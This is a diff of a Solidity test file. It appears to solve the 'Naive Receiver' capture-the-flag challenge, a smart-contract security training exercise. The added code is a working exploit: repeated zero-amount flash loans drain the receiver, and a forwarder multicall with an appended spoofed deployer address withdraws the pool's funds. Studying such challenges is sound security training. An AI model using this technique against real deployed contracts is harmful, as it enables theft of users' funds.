@@ -42,7 +42,11 @@ contract NaiveReceiverChallenge is Test {
         forwarder = new BasicForwarder();
 
         // Deploy pool and fund with ETH
-        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(address(forwarder), payable(weth), deployer);
+        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(
+            address(forwarder),
+            payable(weth),
+            deployer
+        );
 
         // Deploy flashloan receiver contract and fund it with some initial WETH
         receiver = new FlashLoanReceiver(address(pool));
@@ -77,7 +81,57 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
-        
+        bytes[] memory arraycalldata = new bytes[](11);
+
+        // 1. Queue up the 10 flash loans to drain the target contract receiver
+        for (uint i = 0; i < 10; i++) {
+            arraycalldata[i] = abi.encodeCall(
+                NaiveReceiverPool.flashLoan,
+                (receiver, address(weth), 0, "0x")
+            );
+        }
+
+        // 2. Build the 11th call for the target pool withdraw logic
+        arraycalldata[10] = abi.encodePacked(
+            abi.encodeCall(
+                NaiveReceiverPool.withdraw,
+                (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))
+            ),
+            bytes32(uint256(uint160(deployer))) // Trick _msgSender() by packing deployer address context
+        );
+
+        // 3. Package all array items safely into the multicall sequence
+        bytes memory requestcalldata = abi.encodeCall(
+            pool.multicall,
+            arraycalldata
+        );
+
+        // 4. Populate Request parameters ensuring deadline matches live execution time
+        BasicForwarder.Request memory request = BasicForwarder.Request({
+            from: player,
+            target: address(pool),
+            value: 0,
+            gas: 30_000_000,
+            nonce: forwarder.nonces(player),
+            data: requestcalldata,
+            deadline: block.timestamp + 1 days // 🌟 FIXED: Use block.timestamp relative metrics
+        });
+
+        // 5. Structure the EIP-712 typed data signature block correctly
+        bytes32 requestHash = keccak256(
+            abi.encodePacked(
+                "\x19\x01", // 🌟 FIXED: Standard backslash parsing format
+                forwarder.domainSeparator(),
+                forwarder.getDataHash(request)
+            )
+        );
+
+        // 6. Sign using player's key and pack bytes
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, requestHash);
+        bytes memory signature = abi.encodePacked(r, s, v);
+
+        // 7. Fire off transaction processing
+        require(forwarder.execute(request, signature));
     }
 
     /**
@@ -88,12 +142,24 @@ contract NaiveReceiverChallenge is Test {
         assertLe(vm.getNonce(player), 2);
 
         // The flashloan receiver contract has been emptied
-        assertEq(weth.balanceOf(address(receiver)), 0, "Unexpected balance in receiver contract");
+        assertEq(
+            weth.balanceOf(address(receiver)),
+            0,
+            "Unexpected balance in receiver contract"
+        );
 
         // Pool is empty too
-        assertEq(weth.balanceOf(address(pool)), 0, "Unexpected balance in pool");
+        assertEq(
+            weth.balanceOf(address(pool)),
+            0,
+            "Unexpected balance in pool"
+        );
 
         // All funds sent to recovery account
-        assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
+        assertEq(
+            weth.balanceOf(recovery),
+            WETH_IN_POOL + WETH_IN_RECEIVER,
+            "Not enough WETH in recovery account"
+        );
     }
 }
